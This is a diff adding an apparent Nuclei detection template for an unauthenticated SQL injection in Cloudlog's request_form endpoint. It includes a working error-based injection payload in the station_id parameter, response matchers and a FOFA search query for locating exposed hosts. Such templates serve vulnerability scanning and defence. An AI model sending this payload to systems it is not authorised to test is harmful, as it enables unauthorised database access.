@@ -1,0 +1,36 @@
+id: cloudlog-system-sqli
+
+info:
+  name: Cloudlog System - SQL Injection
+  author: s4e-io
+  severity: high
+  description: |
+    Unauthorised SQL injection vulnerability in the Cloudlog system interface request_form. In addition to being able to exploit the SQL injection vulnerability to obtain information from the database, unauthenticated remote attackers can also.
+  reference:
+    - https://github.com/wy876/POC/blob/main/Cloudlog/Cloudlog%E7%B3%BB%E7%BB%9Frequest_form%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: "Login - Cloudlog"
+  tags: cloudlog,sqli
+
+variables:
+  num: "999999999"
+
+http:
+  - raw:
+      - |
+        POST /index.php/oqrs/request_form HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,md5({{num}}),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "A Database Error Occurred", "{{md5({{num}})}}")'
+          - 'contains(content_type, "text/html")'
+          - 'status_code == 500'
+        condition: and
+# digest: 4b0a00483046022100a6ca1dabe5caa689a5a6c85b4e305440a9ac05d1c8290a9f40af7f9abffee18a022100b3e485c1a6b280e358bf80316dca60d7eacd485ae25491140cb599968c08e12b:922c64590222798bb761d5b6d8e72950
